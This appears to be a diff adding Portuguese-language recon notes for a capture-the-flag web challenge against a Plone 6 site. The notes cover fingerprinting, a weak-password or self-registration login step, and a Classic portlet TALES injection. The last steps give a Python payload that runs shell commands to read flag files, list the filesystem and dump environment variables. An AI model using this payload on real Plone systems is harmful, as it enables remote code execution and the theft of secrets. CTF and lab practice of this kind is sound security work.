@@ -1,0 +1,28 @@
+# My Little Plone (WEB, 500 pts) — recon
+# Alvo: http://<HOST>:46600 (container efêmero)
+# Tema: "equestria agora" (MLP) — Plone 6 Classic UI (Barceloneta)
+
+## Fingerprint (14/11, ~15:50)
+Server: waitress
+X-Powered-By: Zope (www.zope.dev), Python (www.python.org)
+
+/++plone++static/plone-compiled.css -> {"error_type": "NotFound"}
+/@@plone-version                    -> {"error_type": "NotFound"}
+/zope.conf                          -> 404
+/CMFPlone/version.txt               -> {"error_type": "NotFound"}
+
+Obs: versão exata NAO vazou nesses paths. Erros vem como JSON {"error_type":"NotFound"}.
+/author/admin existe (confirma user admin). Login via "Acessar" (topo dir) -> /login_form.
+
+## Hipotese de ataque
+CVE-2026-57149 — plone.app.portlets Classic portlet TALES injection (CVSS 9.9, CWE-95).
+Afetados: portlets 7.0.0-7.0.1 (fix 7.0.2 / Plone 6.2). Range bate.
+GHSA-rr49-f9g6-c9r5 | OSV CVE-2026-57149 | fix commit plone/plone.app.portlets@8a0641dc
+Campos Template/Macro do Classic portlet = expressao TALES crua -> RCE, retorno renderizado no HTML.
+
+## Caminho
+1. Login (/login_form): tentar admin:<senha fraca>; senao /@@register
+2. /@@manage-dashboard -> Add -> Classic Portlet
+3. Template = `x | string:PWNED` (confirma injecao em /dashboard)
+4. Template = `x | python:__import__('os').popen('cat /flag* /flag 2>/dev/null; id; ls -la /; env').read()`
+5. Flag IDP{...} sai renderizada no portlet.
